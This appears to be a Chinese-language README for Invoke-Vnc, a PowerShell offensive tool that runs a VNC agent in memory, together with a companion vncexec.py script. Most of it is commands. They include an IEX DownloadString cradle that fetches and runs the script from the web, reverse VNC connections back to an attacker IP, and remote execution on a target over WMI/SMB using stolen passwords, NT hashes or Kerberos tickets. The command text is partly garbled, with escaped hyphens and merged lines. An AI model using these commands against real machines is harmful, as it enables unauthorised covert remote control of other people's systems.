## 项目简介

Invoke-Vnc在内存中执行VNC代理，并启动反向连接或绑定到指定的端口。 支持密码验证。

## 使用

本地调用：

```
Import\-Module Invoke\-Vnc.ps1#Reverse VNC connectionInvoke\-Vnc \-ConType
 \-IpAddress <backconnect\_ip> \-Port 5500 \-Password
 P@ssw0rd#Bind VNC connectionInvoke\-Vnc \-ConType bind \-Port 5900 \-Password P@ssw0rd
```

网络调用：

```
IEX (New\-Object System.Net.Webclient).
DownloadString('https://raw.githubusercontent.com/artkond/Invoke-Vnc
/master/Invoke-Vnc.ps1')#Reverse VNC connectionInvoke\-Vnc \-ConType
 reverse\-IpAddress <backconnect\_ip> \-Port 5500 \-Password P@ssw0rd
#Bind VNC Invoke\-Vnc \-ConType bind \-Port 5900 \-Password P@ssw0rd
```

启动VNC侦听器以捕获反向VNC连接：

```
vncviewer –listen <port>
```

## 通过WMI远程执行代理

如果已对机器进行了身份验证访问（password、nt hash或kerberos ticket），则可以使用vncexec.py脚本来执行VNC代理。

通过SMB将编码的ps1脚本作为bat文件上传，并执行代理以绑定目标上的VNC端口：

```
vncexec.py \-invoke\-vnc\-path Invoke\-Vnc.ps1 \-contype bind \-vncport 
5900 \-vncpass P@ssw0rd \-method 
upload user:pass@target\_ip
```

通过HTTP从攻击者的主机下载脚本，并执行代理以获得反向VNC连接：

```
vncexec.py \-bc\-ip <attacker
's\_host> -httpport 8080 -invoke-vnc-path
```

脚本依赖于最近构建的impacket库。

```
git clone https://github.com/CoreSecurity/impacketcd impacket
sudo python setup.py install
```
